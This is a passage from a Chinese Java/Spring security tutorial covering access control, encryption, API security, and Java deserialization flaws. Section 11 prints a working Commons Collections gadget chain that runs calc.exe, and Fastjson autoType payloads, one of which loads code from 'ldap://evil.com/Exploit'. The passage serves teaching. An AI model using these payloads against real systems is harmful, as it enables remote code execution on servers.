public class SessionSecurityListener implements HttpSessionListener {

    @Autowired
    private AuditLogService auditLogService;

    @Override
    public void sessionCreated(HttpSessionEvent se) {
        HttpSession session = se.getSession();
        session.setMaxInactiveInterval(1800);
    }

    @Override
    public void sessionDestroyed(HttpSessionEvent se) {
        HttpSession session = se.getSession();
        String username = SecurityContextHolder.getContext().getAuthentication() != null
            ? SecurityContextHolder.getContext().getAuthentication().getName() : "anonymous";
        auditLogService.log("SESSION_DESTROYED", username, session.getId());
    }
}
```

### 8.4 Spring Security实战配置

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class ComprehensiveSecurityConfig {

    @Autowired
    private UserDetailsService userDetailsService;

    @Autowired
    private JwtAuthenticationFilter jwtAuthenticationFilter;

    @Autowired
    private RateLimitFilter rateLimitFilter;

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .securityMatcher("/api/**")
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/auth/login", "/api/auth/register").permitAll()
                .requestMatchers("/api/auth/refresh").permitAll()
                .requestMatchers(HttpMethod.GET, "/api/products/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/user/**").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            )
            .exceptionHandling(exceptions -> exceptions
                .authenticationEntryPoint(new JwtAuthenticationEntryPoint())
                .accessDeniedHandler(new JwtAccessDeniedHandler())
            )
            .addFilterBefore(rateLimitFilter, UsernamePasswordAuthenticationFilter.class)
            .addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
                .frameOptions(HeadersConfigurer.FrameOptionsConfig::deny)
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true).maxAgeInSeconds(31536000).preload(true))
            );
        return http.build();
    }

    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return PasswordEncoderFactories.createDelegatingPasswordEncoder();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(List.of("https://app.example.com"));
        configuration.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "PATCH"));
        configuration.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-CSRF-Token"));
        configuration.setAllowCredentials(true);
        configuration.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", configuration);
        return source;
    }
}
```

### 8.5 RBAC与ABAC权限模型

```
RBAC vs ABAC 权限模型
═══════════════════════════════════════════════════════════════════

  RBAC (基于角色的访问控制)
  ──────────────────────────

  用户 ──→ 角色 ──→ 权限
  张三     管理员    用户管理,系统配置,数据导出
  李四     操作员    数据录入,数据查询
  王五     审计员    日志查看,报表生成

  优点: 简单直观,易于管理
  缺点: 角色爆炸(权限组合多时),缺乏上下文感知

  ABAC (基于属性的访问控制)
  ──────────────────────────

  决策 = f(主体属性, 资源属性, 操作属性, 环境属性)

  主体属性: 角色,部门,职位,信任等级
  资源属性: 分类,敏感度,所有者
  操作属性: 读取,写入,删除
  环境属性: 时间,位置,设备,IP

  示例: 允许角色=经理 AND 部门=财务 AND 时间=工作时间
        AND 设备=公司设备 访问 资源=财务报表

  优点: 细粒度控制,上下文感知
  缺点: 复杂度高,性能开销大

═══════════════════════════════════════════════════════════════════
```

**RBAC实现：**

```java
@Entity
@Table(name = "sys_user")
public class SysUser {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, unique = true)
    private String username;

    @Column(nullable = false)
    private String password;

    @ManyToMany(fetch = FetchType.LAZY)
    @JoinTable(name = "sys_user_role",
        joinColumns = @JoinColumn(name = "user_id"),
        inverseJoinColumns = @JoinColumn(name = "role_id"))
    private Set<SysRole> roles = new HashSet<>();
}

@Entity
@Table(name = "sys_role")
public class SysRole {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, unique = true)
    private String roleCode;

    @Column(nullable = false)
    private String roleName;

    @ManyToMany(fetch = FetchType.LAZY)
    @JoinTable(name = "sys_role_permission",
        joinColumns = @JoinColumn(name = "role_id"),
        inverseJoinColumns = @JoinColumn(name = "permission_id"))
    private Set<SysPermission> permissions = new HashSet<>();
}

@Entity
@Table(name = "sys_permission")
public class SysPermission {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, unique = true)
    private String permissionCode;

    @Column(nullable = false)
    private String permissionName;

    @Column(nullable = false)
    private String resource;

    @Column(nullable = false)
    @Enumerated(EnumType.STRING)
    private Action action;

    public enum Action {
        CREATE, READ, UPDATE, DELETE, EXPORT, IMPORT
    }
}

@Service
public class RbacAccessControlService {

    @Autowired
    private SysUserRepository userRepository;

    public boolean hasPermission(Long userId, String resource, SysPermission.Action action) {
        SysUser user = userRepository.findByIdWithRolesAndPermissions(userId);
        return user.getRoles().stream()
            .flatMap(role -> role.getPermissions().stream())
            .anyMatch(perm -> perm.getResource().equals(resource)
                && perm.getAction() == action);
    }
}
```

### 8.6 FAQ

**Q1: JWT和Session哪种方式更安全？**

A: 没有绝对更安全的方案，各有优缺点：Session服务端存储，可以即时撤销，但需要服务端状态管理；JWT无状态，易于水平扩展，但撤销困难。对于需要即时撤销的场景（如踢人下线），Session或带黑名单的JWT更合适。

**Q2: 如何安全地存储JWT？**

A: 推荐存储在HttpOnly、Secure、SameSite=Strict的Cookie中。避免存储在localStorage（XSS可窃取）或sessionStorage中。如果使用Authorization头，需确保前端代码不泄露Token。

**Q3: 什么时候用RBAC，什么时候用ABAC？**

A: 大多数应用使用RBAC即可满足需求。当需要细粒度的上下文感知控制时（如基于时间、位置、设备类型的访问控制），应考虑ABAC或RBAC+ABAC混合模式。



---

## 9. 加密与数据安全

### 9.1 加密算法体系

```
加密算法分类体系
═══════════════════════════════════════════════════════════════════

  ┌─────────────────────────────────────────────────────────────┐
  │                     加密算法体系                              │
  ├─────────────────────────────────────────────────────────────┤
  │                                                             │
  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐   │
  │  │  对称加密      │  │  非对称加密    │  │  哈希算法      │   │
  │  ├───────────────┤  ├───────────────┤  ├───────────────┤   │
  │  │ AES-128/256   │  │ RSA 2048/4096 │  │ SHA-256       │   │
  │  │ ChaCha20      │  │ ECDSA         │  │ SHA-3         │   │
  │  │ 3DES(已过时)  │  │ Ed25519       │  │ BLAKE2/3      │   │
  │  │ DES(已废弃)   │  │ ECDH          │  │ MD5(已废弃)   │   │
  │  └───────────────┘  └───────────────┘  └───────────────┘   │
  │                                                             │
  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐   │
  │  │  消息认证码    │  │  密钥交换      │  │  证书体系      │   │
  │  ├───────────────┤  ├───────────────┤  ├───────────────┤   │
  │  │ HMAC-SHA256   │  │ Diffie-Hellman│  │ X.509         │   │
  │  │ HMAC-SHA512   │  │ ECDH          │  │ PKI           │   │
  │  │ Poly1305      │  │ RSA-KEM       │  │ ACME/Let's    │   │
  │  │ CMAC          │  │              │  │   Encrypt     │   │
  │  └───────────────┘  └───────────────┘  └───────────────┘   │
  │                                                             │
  └─────────────────────────────────────────────────────────────┘
```

### 9.2 对称加密 - AES

```java
@Service
public class AesEncryptionService {

    private static final String AES_ALGORITHM = "AES/GCM/NoPadding";
    private static final int GCM_IV_LENGTH = 12;
    private static final int GCM_TAG_LENGTH = 128;
    private static final int KEY_LENGTH = 256;

    private final SecretKey secretKey;

    public AesEncryptionService(@Value("${encryption.aes.key-path}") String keyPath) throws Exception {
        this.secretKey = loadKey(keyPath);
    }

    public String encrypt(String plaintext) {
        try {
            byte[] iv = new byte[GCM_IV_LENGTH];
            SecureRandom.getInstanceStrong().nextBytes(iv);

            GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
            Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, parameterSpec);

            byte[] ciphertext = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));

            ByteBuffer byteBuffer = ByteBuffer.allocate(iv.length + ciphertext.length);
            byteBuffer.put(iv);
            byteBuffer.put(ciphertext);

            return Base64.getEncoder().encodeToString(byteBuffer.array());
        } catch (Exception e) {
            throw new SecurityException("AES加密失败", e);
        }
    }

    public String decrypt(String encrypted) {
        try {
            byte[] decoded = Base64.getDecoder().decode(encrypted);

            ByteBuffer byteBuffer = ByteBuffer.wrap(decoded);
            byte[] iv = new byte[GCM_IV_LENGTH];
            byteBuffer.get(iv);
            byte[] ciphertext = new byte[byteBuffer.remaining()];
            byteBuffer.get(ciphertext);

            Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
            cipher.init(Cipher.DECRYPT_MODE, secretKey, new GCMParameterSpec(GCM_TAG_LENGTH, iv));

            return new String(cipher.doFinal(ciphertext), StandardCharsets.UTF_8);
        } catch (Exception e) {
            throw new SecurityException("AES解密失败", e);
        }
    }

    private SecretKey loadKey(String keyPath) throws Exception {
        byte[] keyBytes = Files.readAllBytes(Paths.get(keyPath));
        return new SecretKeySpec(keyBytes, "AES");
    }

    public static SecretKey generateKey() throws NoSuchAlgorithmException {
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
        keyGenerator.init(KEY_LENGTH, SecureRandom.getInstanceStrong());
        return keyGenerator.generateKey();
    }
}
```

### 9.3 非对称加密 - RSA

```java
@Service
public class RsaEncryptionService {

    private static final String RSA_ALGORITHM = "RSA/ECB/OAEPWithSHA-256AndMGF1Padding";
    private static final int KEY_SIZE = 4096;
    private static final String SIGNATURE_ALGORITHM = "SHA256withRSA";

    private final PrivateKey privateKey;
    private final PublicKey publicKey;

    public RsaEncryptionService(@Value("${encryption.rsa.key-store-path}") String keyStorePath,
                                 @Value("${encryption.rsa.key-store-password}") String keyStorePassword,
                                 @Value("${encryption.rsa.key-alias}") String keyAlias) throws Exception {
        KeyStore keyStore = KeyStore.getInstance("PKCS12");
        try (InputStream is = Files.newInputStream(Paths.get(keyStorePath))) {
            keyStore.load(is, keyStorePassword.toCharArray());
        }
        this.privateKey = (PrivateKey) keyStore.getKey(keyAlias, keyStorePassword.toCharArray());
        this.publicKey = keyStore.getCertificate(keyAlias).getPublicKey();
    }

    public String encrypt(String plaintext) {
        try {
            Cipher cipher = Cipher.getInstance(RSA_ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, publicKey);
            byte[] encrypted = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(encrypted);
        } catch (Exception e) {
            throw new SecurityException("RSA加密失败", e);
        }
    }

    public String decrypt(String encrypted) {
        try {
            Cipher cipher = Cipher.getInstance(RSA_ALGORITHM);
            cipher.init(Cipher.DECRYPT_MODE, privateKey);
            byte[] decrypted = cipher.doFinal(Base64.getDecoder().decode(encrypted));
            return new String(decrypted, StandardCharsets.UTF_8);
        } catch (Exception e) {
            throw new SecurityException("RSA解密失败", e);
        }
    }

    public String sign(String data) {
        try {
            Signature signature = Signature.getInstance(SIGNATURE_ALGORITHM);
            signature.initSign(privateKey);
            signature.update(data.getBytes(StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(signature.sign());
        } catch (Exception e) {
            throw new SecurityException("RSA签名失败", e);
        }
    }

    public boolean verify(String data, String signatureStr) {
        try {
            Signature signature = Signature.getInstance(SIGNATURE_ALGORITHM);
            signature.initVerify(publicKey);
            signature.update(data.getBytes(StandardCharsets.UTF_8));
            return signature.verify(Base64.getDecoder().decode(signatureStr));
        } catch (Exception e) {
            throw new SecurityException("RSA验签失败", e);
        }
    }

    public static KeyPair generateKeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        keyPairGenerator.initialize(KEY_SIZE, SecureRandom.getInstanceStrong());
        return keyPairGenerator.generateKeyPair();
    }
}
```

### 9.4 哈希与HMAC

```java
@Service
public class HashService {

    public String sha256(String input) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(input.getBytes(StandardCharsets.UTF_8));
            return Hex.encodeHexString(hash);
        } catch (NoSuchAlgorithmException e) {
            throw new SecurityException("SHA-256计算失败", e);
        }
    }

    public String sha512(String input) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-512");
            byte[] hash = digest.digest(input.getBytes(StandardCharsets.UTF_8));
            return Hex.encodeHexString(hash);
        } catch (NoSuchAlgorithmException e) {
            throw new SecurityException("SHA-512计算失败", e);
        }
    }

    public String hmacSha256(String data, SecretKey key) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(key);
            byte[] hmac = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
            return Hex.encodeHexString(hmac);
        } catch (Exception e) {
            throw new SecurityException("HMAC-SHA256计算失败", e);
        }
    }

    public boolean verifyHmac(String data, String expectedHmac, SecretKey key) {
        String actualHmac = hmacSha256(data, key);
        return MessageDigest.isEqual(
            Hex.decodeHex(actualHmac),
            Hex.decodeHex(expectedHmac)
        );
    }

    public String hashPassword(String password) {
        return BCrypt.withDefaults().hashToString(12, password.toCharArray());
    }

    public boolean verifyPassword(String password, String hash) {
        return BCrypt.verifyer().verify(password.toCharArray(), hash).verified;
    }

    public String hashPasswordArgon2(String password, byte[] salt) {
        Argon2PasswordEncoder encoder = new Argon2PasswordEncoder(16, 32, 1, 65536, 3);
        return encoder.encode(password);
    }
}
```

### 9.5 HTTPS原理与配置

```
TLS握手流程 (TLS 1.3)
═══════════════════════════════════════════════════════════════════

  客户端                            服务器
    │                                │
    │  1.ClientHello                 │
    │  支持的TLS版本、密码套件、     │
    │  KeyShare(ClientHello)         │
    │ ─────────────────────────────→ │
    │                                │
    │  2.ServerHello                 │
    │  选定的TLS版本、密码套件、     │
    │  KeyShare(ServerHello)         │
    │  Certificate                   │
    │  CertificateVerify             │
    │  Finished                      │
    │ ←───────────────────────────── │
    │                                │
    │  3.Finished                    │
    │ ─────────────────────────────→ │
    │                                │
    │  4.应用数据(加密传输)          │
    │ ←───────────────────────────→ │
    │                                │
═══════════════════════════════════════════════════════════════════
```

**Spring Boot HTTPS配置：**

```yaml
server:
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${SSL_KEYSTORE_PASSWORD}
    key-store-type: PKCS12
    key-alias: tomcat
    protocol: TLSv1.3
    enabled-protocols: TLSv1.2,TLSv1.3
    ciphers: TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256,TLS_AES_128_GCM_SHA256
  http2:
    enabled: true
  port: 8443
```

```java
@Configuration
public class HttpsRedirectConfig {

    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory tomcat = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint securityConstraint = new SecurityConstraint();
                securityConstraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                securityConstraint.addCollection(collection);
                context.addConstraint(securityConstraint);
            }
        };
        tomcat.addAdditionalTomcatConnectors(redirectConnector());
        return tomcat;
    }

    private Connector redirectConnector() {
        Connector connector = new Connector("org.apache.coyote.http11.Http11NioProtocol");
        connector.setScheme("http");
        connector.setPort(8080);
        connector.setSecure(false);
        connector.setRedirectPort(8443);
        return connector;
    }
}
```

### 9.6 密钥管理

```java
@Service
public class KeyManagementService {

    private static final String KEYSTORE_TYPE = "PKCS12";
    private static final String KEYSTORE_PATH = "/etc/ssl/keystore.p12";

    @Autowired
    private VaultTemplate vaultTemplate;

    public SecretKey getEncryptionKey(String keyId) {
        VaultResponseSupport<Map<String, Object>> response =
            vaultTemplate.read("secret/data/encryption-keys/" + keyId);

        String encodedKey = (String) response.getData().get("key");
        byte[] keyBytes = Base64.getDecoder().decode(encodedKey);
        return new SecretKeySpec(keyBytes, "AES");
    }

    public void rotateKey(String keyId) {
        SecretKey newKey = AesEncryptionService.generateKey();
        String encodedKey = Base64.getEncoder().encodeToString(newKey.getEncoded());

        Map<String, Object> keyData = Map.of(
            "key", encodedKey,
            "algorithm", "AES",
            "keySize", 256,
            "createdAt", Instant.now().toString(),
            "version", getKeyVersion(keyId) + 1
        );

        vaultTemplate.write("secret/data/encryption-keys/" + keyId, keyData);
        auditLogService.log("KEY_ROTATED", keyId);
    }

    public KeyPair getKeyPair(String keyId) throws Exception {
        KeyStore keyStore = KeyStore.getInstance(KEYSTORE_TYPE);
        try (InputStream is = Files.newInputStream(Paths.get(KEYSTORE_PATH))) {
            char[] password = System.getenv("KEYSTORE_PASSWORD").toCharArray();
            keyStore.load(is, password);
        }
        PrivateKey privateKey = (PrivateKey) keyStore.getKey(keyId,
            System.getenv("KEY_PASSWORD").toCharArray());
        PublicKey publicKey = keyStore.getCertificate(keyId).getPublicKey();
        return new KeyPair(publicKey, privateKey);
    }

    private int getKeyVersion(String keyId) {
        try {
            VaultResponseSupport<Map<String, Object>> response =
                vaultTemplate.read("secret/data/encryption-keys/" + keyId);
            return (Integer) response.getData().getOrDefault("version", 0);
        } catch (Exception e) {
            return 0;
        }
    }
}
```

### 9.7 FAQ

**Q1: AES-CBC和AES-GCM应该选哪个？**

A: 优先选择AES-GCM。GCM模式自带认证（AEAD），能同时保证加密和完整性；CBC模式需要单独的HMAC来保证完整性，容易出错（如Padding Oracle攻击）。

**Q2: RSA加密有什么限制？**

A: RSA加密有数据长度限制（密钥长度-填充开销），如2048位RSA最多加密245字节。通常的做法是用RSA加密一个随机AES密钥，再用AES加密数据（混合加密/KEM-DEM模式）。

**Q3: 为什么不应该自己实现加密算法？**

A: 加密算法的实现有很多微妙的安全细节（如时序攻击、填充攻击），即使算法本身安全，实现也可能存在漏洞。应该使用成熟的加密库（如Bouncy Castle、JCA）和标准化的加密方案。

---

## 10. API安全

### 10.1 REST API安全最佳实践

```
API安全架构
═══════════════════════════════════════════════════════════════════

  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
  │  客户端   │ → │  API网关  │ → │  认证服务 │ → │ 业务API  │
  │          │   │          │   │          │   │          │
  │          │   │• 限流    │   │• JWT验证 │   │• 权限检查│
  │          │   │• WAF     │   │• OAuth2  │   │• 输入验证│
  │          │   │• 日志    │   │• API Key │   │• 输出过滤│
  │          │   │• CORS    │   │• MFA     │   │• 审计    │
  └──────────┘   └──────────┘   └──────────┘   └──────────┘

═══════════════════════════════════════════════════════════════════
```

**API安全配置：**

```java
@Configuration
public class ApiSecurityConfig {

    @Bean
    public SecurityFilterChain apiSecurityFilterChain(HttpSecurity http) throws Exception {
        http
            .securityMatcher("/api/**")
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/v1/public/**").permitAll()
                .requestMatchers("/api/v1/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    .jwtAuthenticationConverter(jwtAuthenticationConverter())
                )
            );
        return http.build();
    }

    private JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();
        converter.setJwtGrantedAuthoritiesConverter(jwt -> {
            List<String> roles = jwt.getClaimAsStringList("roles");
            if (roles == null) return Collections.emptyList();
            return roles.stream()
                .map(role -> new SimpleGrantedAuthority("ROLE_" + role))
                .collect(Collectors.toList());
        });
        return converter;
    }
}
```

### 10.2 API网关安全

```java
@Configuration
public class ApiGatewayConfig {

    @Bean
    public RouteLocator customRouteLocator(RouteLocatorBuilder builder) {
        return builder.routes()
            .route("api_v1", r -> r
                .path("/api/v1/**")
                .filters(f -> f
                    .stripPrefix(2)
                    .addRequestHeader("X-Request-Id", UUID.randomUUID().toString())
                    .addRequestHeader("X-Forwarded-Proto", "https")
                    .rateLimit(c -> c
                        .setRate(100)
                        .setKeyResolver(new ApiKeyResolver())
                    )
                    .retry(retry -> retry
                        .setRetries(3)
                        .setStatuses(HttpStatus.INTERNAL_SERVER_ERROR)
                    )
                    .circuitBreaker(cb -> cb
                        .setName("apiCircuitBreaker")
                        .setFallbackUri("forward:/fallback")
                    )
                )
                .uri("lb://api-service")
            )
            .build();
    }
}

@Component
public class ApiKeyResolver implements KeyResolver {

    @Override
    public Mono<String> resolve(ServerWebExchange exchange) {
        String apiKey = exchange.getRequest().getHeaders().getFirst("X-API-Key");
        String clientIp = exchange.getRequest().getRemoteAddress()
            .map(addr -> addr.getAddress().getHostAddress())
            .orElse("unknown");
        return Mono.just(apiKey != null ? apiKey : clientIp);
    }
}
```

### 10.3 限流防刷

```java
@Component
public class RateLimitFilter extends OncePerRequestFilter {

    private final LoadingCache<String, RateLimitInfo> rateLimitCache;

    public RateLimitFilter() {
        this.rateLimitCache = Caffeine.newBuilder()
            .expireAfterWrite(1, TimeUnit.MINUTES)
            .build(key -> new RateLimitInfo(100, 60));
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        String clientId = getClientId(request);
        String endpoint = request.getRequestURI();
        String key = clientId + ":" + endpoint;

        RateLimitInfo rateLimitInfo = rateLimitCache.get(key);

        if (rateLimitInfo.isExceeded()) {
            response.setStatus(429);
            response.setHeader("X-RateLimit-Limit", String.valueOf(rateLimitInfo.getLimit()));
            response.setHeader("X-RateLimit-Remaining", "0");
            response.setHeader("Retry-After", String.valueOf(rateLimitInfo.getResetSeconds()));
            response.getWriter().write("{\"error\": \"Too Many Requests\"}");
            return;
        }

        rateLimitInfo.increment();

        response.setHeader("X-RateLimit-Limit", String.valueOf(rateLimitInfo.getLimit()));
        response.setHeader("X-RateLimit-Remaining",
            String.valueOf(rateLimitInfo.getRemaining()));

        filterChain.doFilter(request, response);
    }

    private String getClientId(HttpServletRequest request) {
        String apiKey = request.getHeader("X-API-Key");
        if (apiKey != null) return "api:" + apiKey;

        String auth = request.getHeader("Authorization");
        if (auth != null) return "auth:" + auth.hashCode();

        return "ip:" + request.getRemoteAddr();
    }

    private static class RateLimitInfo {
        private final int limit;
        private final long windowSeconds;
        private final AtomicLong counter;
        private final long startTime;

        public RateLimitInfo(int limit, long windowSeconds) {
            this.limit = limit;
            this.windowSeconds = windowSeconds;
            this.counter = new AtomicLong(0);
            this.startTime = System.currentTimeMillis();
        }

        public boolean isExceeded() {
            return counter.get() >= limit;
        }

        public void increment() {
            counter.incrementAndGet();
        }

        public int getLimit() { return limit; }
        public long getRemaining() { return Math.max(0, limit - counter.get()); }
        public long getResetSeconds() {
            long elapsed = (System.currentTimeMillis() - startTime) / 1000;
            return Math.max(0, windowSeconds - elapsed);
        }
    }
}
```

### 10.4 GraphQL安全

```
GraphQL安全威胁
═══════════════════════════════════════════════════════════════════

┌────────────────────┬──────────────────────┬───────────────────┐
│  威胁               │    描述               │   防御方案         │
├────────────────────┼──────────────────────┼───────────────────┤
│ 查询深度攻击      │ 嵌套查询导致资源耗尽  │ 限制查询深度(10层) │
│ 批量查询攻击      │ 单次请求大量查询      │ 限制查询复杂度     │
│ 内省查询泄露      │ 暴露完整的Schema      │ 生产环境禁用内省   │
│ 字段建议攻击      │ 通过错误信息枚举字段  │ 禁用字段建议       │
│ 注入攻击          │ SQL/NoSQL注入         │ 参数化查询         │
│ 越权访问          │ 未校验字段级权限      │ 字段级权限控制     │
│ DoS               │ 递归查询/别名攻击     │ 查询复杂度分析     │
└────────────────────┴──────────────────────┴───────────────────┘
═══════════════════════════════════════════════════════════════════
```

**GraphQL安全配置：**

```java
@Configuration
public class GraphQLSecurityConfig {

    @Bean
    public GraphQlSource graphQlSource(ResourceLoader resourceLoader) {
        return GraphQlSource.builder(resourceLoader)
            .schemaResources("classpath:graphql/schema.graphqls")
            .configureGraphQl(graphQlBuilder -> graphQlBuilder
                .instrumentation(new MaxQueryDepthInstrumentation(10))
                .instrumentation(new MaxQueryComplexityInstrumentation(100))
            )
            .build();
    }
}

public class MaxQueryDepthInstrumentation extends InstrumentationAdapter {

    private final int maxDepth;

    public MaxQueryDepthInstrumentation(int maxDepth) {
        this.maxDepth = maxDepth;
    }

    @Override
    public InstrumentationContext<CompletableFuture<ExecutionResult>> beginExecution(
            InstrumentationExecutionParameters parameters) {
        int depth = calculateQueryDepth(parameters.getDocument());
        if (depth > maxDepth) {
            throw new GraphQLError() {
                @Override
                public String getMessage() {
                    return "查询深度超过限制: " + depth + " > " + maxDepth;
                }
                @Override
                public List<SourceLocation> getLocations() {
                    return Collections.emptyList();
                }
                @Override
                public ErrorClassification getErrorType() {
                    return ErrorType.ValidationError;
                }
            };
        }
        return super.beginExecution(parameters);
    }

    private int calculateQueryDepth(Document document) {
        return document.getDefinitions().stream()
            .filter(def -> def instanceof OperationDefinition)
            .mapToInt(def -> calculateSelectionSetDepth(
                ((OperationDefinition) def).getSelectionSet(), 1))
            .max()
            .orElse(0);
    }

    private int calculateSelectionSetDepth(SelectionSet selectionSet, int currentDepth) {
        if (selectionSet == null) return currentDepth;
        return selectionSet.getSelections().stream()
            .filter(sel -> sel instanceof Field)
            .mapToInt(sel -> {
                Field field = (Field) sel;
                if (field.getSelectionSet() == null) return currentDepth;
                return calculateSelectionSetDepth(field.getSelectionSet(), currentDepth + 1);
            })
            .max()
            .orElse(currentDepth);
    }
}
```

### 10.5 FAQ

**Q1: API Key和JWT有什么区别？**

A: API Key是静态的、长期有效的标识符，通常用于服务间调用；JWT是动态的、短期有效的令牌，包含用户身份和权限信息，通常用于用户认证。API Key更简单但功能有限，JWT更灵活但实现更复杂。

**Q2: 如何实现API版本安全？**

A: 1) 通过URL路径版本化（/api/v1/、/api/v2/）；2) 为每个版本维护独立的安全策略；3) 废弃旧版本时提供迁移指南；4) 设置版本淘汰时间表。

**Q3: 如何防止API被爬虫滥用？**

A: 1) 实施基于IP和API Key的双重限流；2) 添加请求签名验证；3) 使用CAPTCHA验证可疑请求；4) 监控异常的请求模式。

---

## 11. 反序列化漏洞

### 11.1 Java反序列化原理

Java反序列化是将字节流还原为Java对象的过程。当应用对不可信数据进行反序列化时，攻击者可以构造恶意序列化数据来执行任意代码。

```
Java反序列化攻击链
═══════════════════════════════════════════════════════════════════

  攻击者构造恶意序列化数据
    │
    │  序列化数据包含:
    │  ┌─────────────────────────────────────────────┐
    │  │  Commons Collections 利用链                   │
    │  │                                             │
    │  │  AnnotationInvocationHandler                │
    │  │    → HashMap                                │
    │  │      → TiedMapEntry                         │
    │  │        → LazyMap                            │
    │  │          → ChainedTransformer               │
    │  │            → InvokerTransformer              │
    │  │              → Runtime.exec("calc")         │
    │  └─────────────────────────────────────────────┘
    │
    ▼
  服务器反序列化 → 触发利用链 → 任意代码执行

═══════════════════════════════════════════════════════════════════
```

### 11.2 Commons Collections利用链

```java
// Commons Collections 反序列化利用链示例(仅用于理解原理)

// 1. 构造Transformer链
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"calc.exe"})
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

// 2. 构造触发链
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
Map outerMap = new HashMap();
outerMap.put(entry, "value");

// 3. 序列化
ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(outerMap);

// 4. 反序列化触发
ObjectInputStream ois = new ObjectInputStream(
    new ByteArrayInputStream(bos.toByteArray()));
ois.readObject();  // 触发利用链,执行calc.exe
```

### 11.3 Fastjson漏洞

Fastjson是阿里巴巴的JSON解析库，历史上存在多个反序列化漏洞。

```
Fastjson漏洞历史
═══════════════════════════════════════════════════════════════════

┌──────────────┬──────────────┬──────────────────────────────┐
│  漏洞编号     │  影响版本     │      漏洞描述                 │
├──────────────┼──────────────┼──────────────────────────────┤
│ CVE-2017-18349│ < 1.2.25    │ autoType默认开启,RCE          │
│ CVE-2019-xxxx │ 1.2.25-48   │ autoType绕过                  │
│ CVE-2020-xxxx │ 1.2.48-68   │ 缓存绕过                     │
│ CVE-2020-xxxx │ 1.2.68-80   │ expectClass绕过              │
│ CVE-2022-xxxx │ 1.2.80-83   │ 特定Gadget链绕过             │
└──────────────┴──────────────┴──────────────────────────────┘

攻击Payload示例:
──────────────────────────────────────────────────────────────
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://evil.com/Exploit",
    "autoCommit": true
}

或:
{
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
}
═══════════════════════════════════════════════════════════════════
```

### 11.4 修复方案

```java
@Configuration
public class DeserializationSecurityConfig {

    @Bean
    public ObjectMapper secureObjectMapper() {
